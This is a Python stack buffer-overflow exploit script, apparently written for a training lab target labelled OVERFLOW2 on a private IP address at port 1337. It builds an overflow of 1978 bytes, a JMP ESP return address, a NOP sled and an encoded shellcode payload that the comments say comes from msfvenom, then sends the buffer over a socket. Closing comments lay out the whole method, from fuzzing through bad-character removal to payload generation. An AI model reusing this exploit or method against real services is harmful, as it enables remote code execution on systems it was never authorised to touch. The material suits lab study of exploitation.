import socket
ip = "10.10.242.131"
port = 1337
prefix = "OVERFLOW2 "
offset = 1978 
overflow = "A" * offset
retn = "\xAF\x11\x50\x62" 
padding = "\x90" * 16
payload = ("\xdb\xd2\xb8\x42\xa2\xa4\x39\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x13\x03\x01\xb1\x46\xcc\x79\x5d\x04"
"\x2f\x81\x9e\x69\xb9\x64\xaf\xa9\xdd\xed\x80\x19\x95\xa3\x2c"
"\xd1\xfb\x57\xa6\x97\xd3\x58\x0f\x1d\x02\x57\x90\x0e\x76\xf6"
"\x12\x4d\xab\xd8\x2b\x9e\xbe\x19\x6b\xc3\x33\x4b\x24\x8f\xe6"
"\x7b\x41\xc5\x3a\xf0\x19\xcb\x3a\xe5\xea\xea\x6b\xb8\x61\xb5"
"\xab\x3b\xa5\xcd\xe5\x23\xaa\xe8\xbc\xd8\x18\x86\x3e\x08\x51"
"\x67\xec\x75\x5d\x9a\xec\xb2\x5a\x45\x9b\xca\x98\xf8\x9c\x09"
"\xe2\x26\x28\x89\x44\xac\x8a\x75\x74\x61\x4c\xfe\x7a\xce\x1a"
"\x58\x9f\xd1\xcf\xd3\x9b\x5a\xee\x33\x2a\x18\xd5\x97\x76\xfa"
"\x74\x8e\xd2\xad\x89\xd0\xbc\x12\x2c\x9b\x51\x46\x5d\xc6\x3d"
"\xab\x6c\xf8\xbd\xa3\xe7\x8b\x8f\x6c\x5c\x03\xbc\xe5\x7a\xd4"
"\xc3\xdf\x3b\x4a\x3a\xe0\x3b\x43\xf9\xb4\x6b\xfb\x28\xb5\xe7"
"\xfb\xd5\x60\xa7\xab\x79\xdb\x08\x1b\x3a\x8b\xe0\x71\xb5\xf4"
"\x11\x7a\x1f\x9d\xb8\x81\xc8\xa8\x35\x84\xe0\xc5\x47\x96\xe1"
"\x49\xc1\x70\x6b\x62\x87\x2b\x04\x1b\x82\xa7\xb5\xe4\x18\xc2"
"\xf6\x6f\xaf\x33\xb8\x87\xda\x27\x2d\x68\x91\x15\xf8\x77\x0f"
"\x31\x66\xe5\xd4\xc1\xe1\x16\x43\x96\xa6\xe9\x9a\x72\x5b\x53"
"\x35\x60\xa6\x05\x7e\x20\x7d\xf6\x81\xa9\xf0\x42\xa6\xb9\xcc"
"\x4b\xe2\xed\x80\x1d\xbc\x5b\x67\xf4\x0e\x35\x31\xab\xd8\xd1"
"\xc4\x87\xda\xa7\xc8\xcd\xac\x47\x78\xb8\xe8\x78\xb5\x2c\xfd"
"\x01\xab\xcc\x02\xd8\x6f\xec\xe0\xc8\x85\x85\xbc\x99\x27\xc8"
"\x3e\x74\x6b\xf5\xbc\x7c\x14\x02\xdc\xf5\x11\x4e\x5a\xe6\x6b"
"\xdf\x0f\x08\xdf\xe0\x05") 
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")


# Step 1 - After fuzzing, create pattern and add to payload 
# Step 2 Set offset and set payload back to an empty string, and set retn to 4 "B"
# Step 3, set payload variable to BADCHARS, 
# Step 4 once we find our ESP Jump, we set retn address of vulnerable module
# Step 5 and 6 - Remove badchars and rerun until no more are found, then create payload via msfvenom and add here along with NOPS (\x90) for padding